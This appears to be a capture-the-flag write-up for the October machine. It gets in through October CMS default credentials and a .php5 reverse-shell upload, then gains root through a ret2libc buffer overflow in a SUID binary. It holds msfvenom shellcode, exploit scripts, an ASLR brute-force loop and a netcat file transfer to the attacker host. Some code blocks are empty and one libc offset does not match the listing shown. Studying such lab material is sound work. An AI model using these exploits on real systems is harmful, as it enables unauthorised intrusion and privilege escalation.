## Vulnerability Discovery

Navigating to the web service, we have an instance of `October CMS`.

![](/assets/images/htb-october/october-homepage.png)

Since the box was released on April 20, 2017, this box was intended to be solved with an exploit that likely came out a few days before that date.
[The following page](https://www.exploit-db.com/exploits/41936) shows that there are multiple vulnerabilities associated with October CMS 1.0.412 as of April 25, 2017 which is 5 days after this box was released.
The most interesting one is one where an authenticated user with media or asset management permissions is able to upload a file to gain remote code execution.

At this point, I tried creating a default user, though that user did not have those permissions.
After doing some more research on October CMS, I tried searching for October CMS default login credentials which happened to be `admin/admin`.
At this point, I needed to find where the administrative login page could be found. A google search helped be identify that I can sign into the CMS backend at the `http://10.10.10.16/backend/backend/auth/signin` endpoint.

![](/assets/images/htb-october/october-administration-login-page.png)

Supplying the default login credentials `admin/admin`, I was granted access to the administration page:

![](/assets/images/htb-october/october-administration-page.png)

At this point, I wanted to fingerprint the CMS version so I could determine whether the file upload vulnerability I discovered earlier would work before running it.

![](/assets/images/htb-october/october-cms-version-permission-denied.png)

## Exploiting the Vulnerability (Missing file extension in blacklist)

At this point, I figured it wouldn't hurt to try to upload a php reverse shell to get remote code execution. The exploit I found from earlier mentions that October CMS 1.0.412 uses a blacklist to prevent users from uploading certain files with malicious extentions. The problem with this approach is that as web server technologies evolve, more and more extensions will become valid and those files will be processed as PHP code. The blacklist did not check for the `.php5` file extension, and as a result, I was able to upload a php reverse shell to the web server:

![](/assets/images/htb-october/october-upload-php-reverse-shell.png)

Visiting the reverse shell at `http://10.10.10.16/storage/app/media/r0kit-rsh.php5` triggered the web server to connect back to my netcat listener on port 2001:

```

```

After [upgrading my reverse shell to a pseudo terminal](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2), I managed to get the user flag:

```

```

## Privilege Escalation

After poking around for a bit, I ran across a suspicious SUID binary:

```bash
find / -perm -4000 2>/dev/null
```

```
/bin/umount                 
/bin/ping      
/bin/fusermount
/bin/su
/bin/ping6
/bin/mount 
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp               
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/local/bin/ovrflw
```

The `/usr/local/bin/ovrflw` binary was very suspicious, especially since it was added to the machine April 21, 2017 which was a day after the machine was released:

```
$ ls -la /usr/local/bin/ovrflw
-rwsr-xr-x 1 root root 7377 Apr 21  2017 /usr/local/bin/ovrflw
```

Fingerprinting the file, it happened to be an ELF:

```
$ file /usr/local/bin/ovrflw
/usr/local/bin/ovrflw: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped
```

I did some basic dynamic analysis on this binary to see which library calls it was making:

```
$ ltrace /usr/local/bin/ovrflw
printf("Syntax: %s <input string>\n", "/usr/local/bin/ovrflw"Syntax: /usr/local/bin/ovrflw <input string>
)                                                                   = 45
exit(0 <no return ...>
+++ exited (status 0) +++
```

At this point, I figured I should try supplying an argument to the program and see how it would behave:

```
$ ltrace /usr/local/bin/ovrflw r0kit
__libc_start_main(0x804847d, 2, 0xbfc441d4, 0x80484d0 <unfinished ...>
strcpy(0xbfc440cc, "r0kit")                                                                                                      = 0xbfc440cc
+++ exited (status 0) +++
```

The program was very simple since it was only copying a string to a memory address. I tried running the same program again to see if the anything would change:

```
$ ltrace /usr/local/bin/ovrflw r0kit
__libc_start_main(0x804847d, 2, 0xbfd712b4, 0x80484d0 <unfinished ...>
strcpy(0xbfd711ac, "r0kit")                                                                                                      = 0xbfd711ac
+++ exited (status 0) +++
```

Since the memory address changed, I figured the ASLR kernel countermeasure was enabled. I was also able to verify that ASLR was enabled by checking the following:

```
$ cat /proc/sys/kernel/randomize_va_space
2
```

2 meant that ASLR was enabled to fully randomize the stack layout which was why the memory address would change after every attempt.

At this point, I figured it would be better to develop a buffer overflow exploit for this binary on one of my local machines, so I transferred the file from the October machine to my kali machine via netcat.

On the October machine:

```bash
cat /usr/local/bin/ovrflw - | nc 10.10.14.33 2002
```

On my kali machine:

```
$ ncat -nlvp 2002 > overflw
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2002
Ncat: Listening on 0.0.0.0:2002
Ncat: Connection from 10.10.10.16.
Ncat: Connection from 10.10.10.16:60560.
```

Eventually, I stopped the download and verified the file's checksum to ensure it wasn't corrupt:

```
$ sha1sum /usr/local/bin/ovrflw
e93408c2c717d425fd175818697c9a8d62c5022a  /usr/local/bin/ovrflw
```

The checksum matched on my kali machine!

## Enabling Core Dumps

*Word of caution: only enable core dumps on debugging/development machines since they can contain sensitive information!*

This isn't a necessary step, but if you wish to enable core dumps on your machine, you can do something like the following:

```bash
echo '/tmp/core_%e.%p' | sudo tee /proc/sys/kernel/core_pattern
sudo systemctl daemon-reload
ulimit -c unlimited
```

The following command below disables ASLR so that you can reliably overflow a particular address:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Since ASLR is enabled on the target machine, I figured I could repeatedly run the buffer overflow until I got lucky and hit the right address since there was no rate limiting or lockout mechanism in attempting to exploit `/usr/local/bin/ovrflw`.

For exploit development on Linux, I like to use the [gdb](https://www.gnu.org/software/gdb/) with [gef](https://gef.readthedocs.io/en/master/), so I loaded up the binary in gdb with the following:

![](/assets/images/htb-october/october-gdb-load-binary.png)

Next, I went ahead and generated a cyclic pattern with [pwntools](https://docs.pwntools.com/en/stable/commandline.html) so that I could determine how big the buffer was before the program would crash:

![](/assets/images/htb-october/october-privesc-find-initial-crash-offset.png)

Notably, we can see that the crash happened at `0x62616164` in the buffer which translates to `daab` in little endian ascii which meant that the buffer was 112 bytes long.

```
$ pwn cyclic -l 0x62616164
112
```

At this point, I needed to take control over EIP, so I wrote the following program to keep track of my progress:

```python
import struct
import sys

buf_len = 112
eip = struct.pack("<I", 0xdeadbeef)
buf = b'A' * buf_len
buf += eip
sys.stdout.buffer.write(buf)
```

I then ran the program in gdb/gef like the following:

![](/assets/images/htb-october/october-control-eip-crash-offset.png)

Excellent! I was able to control the EIP register! At this point, I needed to put some shellcode in the buffer to spawn a shell and put it into the buffer. I used `msfvenom` to do this for me.

```
$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=/bin/bash -f python -b '\x00'
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

buf =  b""
buf += b"\xdb\xd9\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0c\xba\x17"
buf += b"\xa5\x80\x35\x31\x53\x18\x03\x53\x18\x83\xeb\xeb\x47"
buf += b"\x75\x5f\x18\xd0\xef\xf2\x78\x88\x22\x90\x0d\xaf\x55"
buf += b"\x79\x7e\x58\xa6\xed\xaf\xfa\xcf\x83\x26\x19\x5d\xb4"
buf += b"\x32\xde\x62\x44\x6d\xbc\x0b\x2a\x5e\x22\xad\xc1\xc8"
buf += b"\xa2\x7a\x75\x81\x42\x49\xf9"
```

Note that I needed to encode the null byte because it is a bad character for stdin which is how the payload will be delivered to the vulnerable root SUID program.

I then updated my exploit to include the exploit in the buffer:

```python
import struct
import sys 

shellcode = b"" 
shellcode += b"\xdb\xd9\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0c\xba\x17"
shellcode += b"\xa5\x80\x35\x31\x53\x18\x03\x53\x18\x83\xeb\xeb\x47"
shellcode += b"\x75\x5f\x18\xd0\xef\xf2\x78\x88\x22\x90\x0d\xaf\x55"
shellcode += b"\x79\x7e\x58\xa6\xed\xaf\xfa\xcf\x83\x26\x19\x5d\xb4"
shellcode += b"\x32\xde\x62\x44\x6d\xbc\x0b\x2a\x5e\x22\xad\xc1\xc8"
shellcode += b"\xa2\x7a\x75\x81\x42\x49\xf9"

buf_len = 112 
eip = struct.pack("<I", 0xdeadbeef)
buf = b"\x90" * (buf_len - len(shellcode)) + shellcode
buf += eip 

sys.stdout.buffer.write(buf)
```

Before proceeding, I wanted to check whether the stack was executable to verify whether I could execute shellcode directly from the buffer I used to overflow the stack:

```
$ readelf -l /usr/local/bin/ovrflw

Notice how `GNU_STACK` is not executable since it doesn't have the `X` flag enabled. This means that if we overflow the stack, we will not be able to execute code from within our buffer.
We can overcome this with a trick known as **return to libc** where we can jump to a memory address in libc and supply the necessary arguments.

For this scenario, I needed to run `system("/bin/sh")` to get a root shell. The call to `system()` is located in `/lib/i386-linux-gnu/libc.so.6` which is dynamically linked to the executable.
We can check which shared object files are dynamically linked to `/usr/local/bin/ovrflw` with the following command:

```
$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb77be000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7604000)
        /lib/ld-linux.so.2 (0x800ae000)
```

We also need to find the offsets in `/lib/i386-linux-gnu/libc.so.6` that point to the `system()` and `exit()` functions with the command below:

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)@"              
   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10

   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1037: 00128b50    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  1492: 000fb480    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2386: 000fbff0     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```

Here, we can see that the calls to `exit()` and `system()` are located at offsets `0x00033260` and `0x00040310` in `/lib/i386-linux-gnu/libc.so.6` respectively.

Next, we need to find a string that points to a shell since we cannot provide on in our overflow buffer. We can find such strings in `/lib/i386-linux-gnu/libc.so.6`:

```
data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
 162bac /bin/sh
 164b10 /bin/csh
```

As seen above, `/bin/sh` is located at offset 0x162bac in `/lib/i386-linux-gnu/libc.so.6`.

We can also search for `/bin/sh` with GDB:

```
$ gdb -q /usr/local/bin/ovrflw

```

At this point, we can remap the exact base address by checking where `/lib/i386-linux-gnu/libc.so.6` is located with the following:

```
data@october:/dev/shm$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb773e000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7584000)
        /lib/ld-linux.so.2 (0x800eb000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb7754000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb759a000)
        /lib/ld-linux.so.2 (0x800dc000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb77cf000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7615000)
        /lib/ld-linux.so.2 (0x800f5000)
```

Notice how the base address of `/lib/i386-linux-gnu/libc.so.6` changes each time. This is because ASLR is enabled.
On 32-bit machines, the chance of guessing the base address is 1/4096 which can be brute-forced very quickly.
Therefore, the base address of `/lib/i386-linux-gnu/libc.so.6` can be guessed with enough attempts.
For this example, I will remap the absolute addresses of `exit()` and `system()` like the following:

```
exit    = 0xb7584000+0x00033260 = 0xb75b7260
system  = 0xb7584000+0x00040310 = 0xb75c4310
/bin/sh = 0xb7584000+0x00162bac = 0xb76e6bac
```

I then updated `exploit.py` like the following:

```python
import struct
import sys

buf_len = 112
system_addr = struct.pack("<I", 0xb75c4310)
exit_ret_addr = struct.pack("<I", 0xb75b7260)
binsh_addr = struct.pack("<I", 0xb76e6bac)
buf = b"\x90" * buf_len
buf += system_addr + exit_ret_addr + binsh_addr

sys.stdout.buffer.write(buf)
```

The format of the buffer is essentially the following:

```
NOP SLED|RETURN ADDRESS|PREVIOUS STACK FRAME ADDRESS|FUNCTION ARGUMENTS
```

I wrote `loop-exploit.sh` to run `exploit.py` until I got a root shell:

```bash
#!/bin/sh

while true; do
    /usr/local/bin/ovrflw $(python3 exploit.py)
done
```

```

## Countermeasures

* Keep October CMS updated to the latest version.
* Change the default login credentials on October CMS.
* Upgrade the operating system the latest version (x64 bit is preferred to make ASLR more effective).
* Don't keep vulnerable root SUID binaries around on the machine.
